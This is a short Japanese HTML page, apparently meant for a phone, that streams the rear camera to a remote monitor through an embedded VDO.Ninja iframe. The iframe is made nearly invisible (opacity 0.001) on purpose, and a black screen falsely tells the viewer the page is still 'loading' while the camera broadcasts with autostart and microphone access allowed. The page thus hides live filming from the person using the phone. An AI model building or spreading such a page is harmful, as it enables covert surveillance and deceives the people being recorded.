<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow" />
  <title>カメラ起動</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background: #000;
    }

    /* 重要：display:none にすると配信が止まる可能性があるので NG
       “ほぼ透明”で裏で動かし続ける */
    iframe#vdo {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: 0;
      opacity: 0.001;
      pointer-events: none;
    }

    /* ユーザーに見せる黒画面 */
    .overlay {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 24px;
      background: #000;
      color: #fff;
      font-family: system-ui, -apple-system, "Hiragino Sans", "Noto Sans JP", sans-serif;
      line-height: 1.8;
      font-size: 18px;
      letter-spacing: 0.02em;
      user-select: none;
      -webkit-user-select: none;
      pointer-events: none; /* 触れない＝事故らない */
    }

    .overlay .note {
      margin-top: 12px;
      font-size: 13px;
      opacity: 0.7;
      line-height: 1.7;
    }
  </style>
</head>
<body>
  <iframe
    id="vdo"
    allow="camera *; microphone *; autoplay; fullscreen"
    referrerpolicy="no-referrer"
  ></iframe>

  <div class="overlay">
    <div>
      読み込み中…<br>
      このままの画面でお待ちください。
      <div class="note">※スマホをスリープ状態にしないでください。</div>
    </div>
  </div>

  <script>
    // camera.html と monitor.html で同じ値にする（英数字推奨）
    const STREAM_ID = "toaCam01";

    // VDO.Ninja：送信（カメラ側）
    // 外カメラ優先：facing=rear
    // autostart：開始操作を極力削る（最初の許可は必須）
    const src =
      "https://vdo.ninja/?" +
      "push=" + encodeURIComponent(STREAM_ID) +
      "&webcam" +
      "&autostart" +
      "&facing=rear" +
      "&cleanoutput" +
      "&hidehome" +
      "&transparent";

    document.getElementById("vdo").src = src;
  </script>
</body>
</html>
